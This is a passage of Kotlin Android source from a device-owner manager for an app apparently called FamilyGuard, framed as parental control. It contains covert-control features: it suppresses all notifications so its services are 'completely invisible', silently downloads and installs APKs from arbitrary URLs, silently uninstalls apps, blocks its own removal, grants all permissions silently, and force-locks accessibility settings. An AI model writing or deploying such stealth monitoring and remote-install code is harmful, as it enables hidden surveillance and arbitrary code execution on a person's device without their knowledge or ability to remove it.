        return results
    }
    
    /**
     * Hide ALL FamilyGuard notifications by denying POST_NOTIFICATIONS permission.
     * This makes foreground services completely invisible.
     */
    fun hideAllNotifications(): Boolean {
        if (!isDeviceOwner()) {
            Log.d(TAG, "Cannot hide notifications - not device owner")
            return false
        }
        
        return try {
            // Deny POST_NOTIFICATIONS permission for our app
            val result = dpm.setPermissionGrantState(
                adminComponent,
                context.packageName,
                android.Manifest.permission.POST_NOTIFICATIONS,
                DevicePolicyManager.PERMISSION_GRANT_STATE_DENIED
            )
            Log.d(TAG, "POST_NOTIFICATIONS denied: $result - All notifications will be hidden")
            
            // Also cancel any existing notifications
            try {
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                nm.cancelAll()
            } catch (e: Exception) {
                Log.w(TAG, "Could not cancel existing notifications: ${e.message}")
            }
            
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding notifications", e)
            false
        }
    }

    // ==========================================
    // FEATURE 6: SILENT APP INSTALL/UNINSTALL
    // ==========================================

    /**
     * Silently install an APK from a URL.
     * Device Owner can install apps without user confirmation.
     */
    fun installAppFromUrl(apkUrl: String, onResult: (Boolean, String) -> Unit) {
        if (!isDeviceOwner()) {
            onResult(false, "Not device owner")
            return
        }
        
        scope.launch {
            try {
                Log.d(TAG, "Downloading APK from: $apkUrl")
                
                // Download APK
                val url = URL(apkUrl)
                val connection = url.openConnection()
                connection.connectTimeout = 30000
                connection.readTimeout = 60000
                val inputStream = connection.getInputStream()
                val totalSize = connection.contentLength.toLong()
                
                // Install using PackageInstaller
                installApkFromStream(inputStream, totalSize, onResult)
                
            } catch (e: Exception) {
                Log.e(TAG, "Error installing app from URL", e)
                withContext(Dispatchers.Main) {
                    onResult(false, "Download failed: ${e.message}")
                }
            }
        }
    }

    /**
     * Install APK from an InputStream using PackageInstaller
     */
    private fun installApkFromStream(
        inputStream: InputStream, 
        totalSize: Long,
        onResult: (Boolean, String) -> Unit
    ) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )
            
            if (totalSize > 0) {
                params.setSize(totalSize)
            }
            
            // Device Owner can install without user confirmation
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }
            
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            // Write APK data to session
            session.openWrite("package", 0, totalSize).use { outputStream ->
                inputStream.copyTo(outputStream)
                session.fsync(outputStream)
            }
            
            // Create a PendingIntent for the install result
            val intent = Intent(context, InstallResultReceiver::class.java).apply {
                action = "com.familyguardpro.INSTALL_RESULT"
                putExtra("session_id", sessionId)
            }
            
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context,
                sessionId,
                intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_MUTABLE
            )
            
            // Commit the session
            session.commit(pendingIntent.intentSender)
            
            Log.d(TAG, "Install session committed: $sessionId")
            onResult(true, "Install initiated")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in silent install", e)
            onResult(false, "Install failed: ${e.message}")
        }
    }

    /**
     * Silently install APK from local file path (synchronous).
     * Used for self-update functionality.
     */
    fun silentInstallPackage(apkPath: String): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "silentInstallPackage: Not device owner")
            return false
        }
        
        return try {
            val apkFile = java.io.File(apkPath)
            if (!apkFile.exists()) {
                Log.e(TAG, "silentInstallPackage: APK file not found: $apkPath")
                return false
            }
            
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )
            
            params.setSize(apkFile.length())
            
            // Device Owner can install without user confirmation
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }
            
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            // Write APK data to session
            java.io.FileInputStream(apkFile).use { inputStream ->
                session.openWrite("package", 0, apkFile.length()).use { outputStream ->
                    inputStream.copyTo(outputStream)
                    session.fsync(outputStream)
                }
            }
            
            // Create a PendingIntent for the install result
            val intent = Intent(context, InstallResultReceiver::class.java).apply {
                action = "com.familyguardpro.INSTALL_RESULT"
                putExtra("session_id", sessionId)
                putExtra("is_self_update", true)
            }
            
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context,
                sessionId,
                intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_MUTABLE
            )
            
            // Commit the session
            session.commit(pendingIntent.intentSender)
            
            Log.d(TAG, "Self-update install session committed: $sessionId from $apkPath")
            true
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in silentInstallPackage", e)
            false
        }
    }

    /**
     * Silently uninstall an app by package name.
     */
    fun uninstallApp(packageName: String, onResult: (Boolean, String) -> Unit) {
        if (!isDeviceOwner()) {
            onResult(false, "Not device owner")
            return
        }
        
        try {
            val packageInstaller = context.packageManager.packageInstaller
            
            val intent = Intent(context, InstallResultReceiver::class.java).apply {
                action = "com.familyguardpro.UNINSTALL_RESULT"
                putExtra("package_name", packageName)
            }
            
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context,
                packageName.hashCode(),
                intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_MUTABLE
            )
            
            packageInstaller.uninstall(packageName, pendingIntent.intentSender)
            
            Log.d(TAG, "Uninstall initiated for: $packageName")
            onResult(true, "Uninstall initiated")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error uninstalling app: $packageName", e)
            onResult(false, "Uninstall failed: ${e.message}")
        }
    }

    // ==========================================
    // PROVISIONING HELPERS
    // ==========================================

    /**
     * Called after Device Owner provisioning completes.
     * Sets up initial DO policies and configurations.
     */
    fun onProvisioningComplete(extras: PersistableBundle?) {
        if (!isDeviceOwner()) {
            Log.e(TAG, "onProvisioningComplete called but not device owner!")
            return
        }
        
        Log.d(TAG, "=== Device Owner Provisioning Complete ===")
        
        // 1. Mark as provisioned
        markProvisioned()
        
        // 2. Extract parent info from provisioning extras
        val parentUserId = extras?.getString("com.familyguardpro.PARENT_USER_ID")
        val serverUrl = extras?.getString("com.familyguardpro.SERVER_URL")
        val deviceName = extras?.getString("com.familyguardpro.DEVICE_NAME")
        
        if (parentUserId != null) {
            val prefManager = PreferenceManager(context)
            prefManager.setParentId(parentUserId)
            if (serverUrl != null) {
                prefManager.setServerUrl(serverUrl)
            }
        }
        
        // 3. Enable uninstall protection
        setUninstallProtection(true)
        
        // 4. Grant all runtime permissions silently
        grantAllPermissions()
        
        // 5. Set up accessibility auto-recovery
        setAccessibilityAutoRecover(true)
        forceEnableAccessibility()
        lockAccessibilitySettings()
        
        // 6. Run OEM optimizer
        scope.launch {
            try {
                val optimizer = OemOptimizerFactory.createOptimizer(context)
                optimizer.optimize()
                Log.d(TAG, "OEM optimization completed for: ${Build.MANUFACTURER}")
            } catch (e: Exception) {
                Log.e(TAG, "OEM optimization failed", e)
            }
        }
        
        // 7. Set additional user restrictions for child device
        try {
            // Prevent installing from unknown sources
            dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_INSTALL_UNKNOWN_SOURCES)
            // Prevent USB debugging changes
            dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_DEBUGGING_FEATURES)
        } catch (e: Exception) {
            Log.e(TAG, "Error setting user restrictions", e)
        }
        
        Log.d(TAG, "=== DO Setup Complete ===")
    }

    /**
     * Clean up Device Owner - called when removing DO mode
     */
    fun removeDeviceOwner() {
        if (!isDeviceOwner()) return
        
        try {
            // Remove all user restrictions
            dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
            dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_INSTALL_UNKNOWN_SOURCES)
            dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_DEBUGGING_FEATURES)
            dpm.clearUserRestriction(adminComponent, "no_config_accessibility")
            
            // Unlock accessibility so it can be freely modified again
            unlockAccessibilitySettings()
            
            // Unhide app
            hideApp(false)
            
            // Remove uninstall block
            setUninstallProtection(false)
            
            // Clear DO preferences
            val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
            prefs.edit().clear().apply()
            
            // Remove device owner
            dpm.clearDeviceOwnerApp(context.packageName)
            
            Log.d(TAG, "Device Owner removed")
        } catch (e: Exception) {
            Log.e(TAG, "Error removing Device Owner", e)
        }
    }
}
